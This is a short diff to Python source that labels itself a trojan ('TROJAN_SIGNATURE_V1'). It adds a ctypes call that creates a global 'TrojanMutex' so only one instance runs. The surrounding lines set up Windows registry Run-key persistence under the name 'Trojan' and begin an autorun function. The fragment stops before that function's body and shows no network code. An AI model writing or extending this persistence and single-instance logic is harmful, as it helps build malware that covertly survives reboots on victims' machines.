@@ -1,5 +1,5 @@
 # TROJAN_SIGNATURE_V1
-
+import ctypes
 import os
 import time
 import socket
@@ -8,6 +8,8 @@ import threading
 
 _REG_KEY  = r"Software\Microsoft\Windows\CurrentVersion\Run"
 _REG_NAME = "Trojan"
+
+ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\TrojanMutex")
 
 
 def _add_autorun():
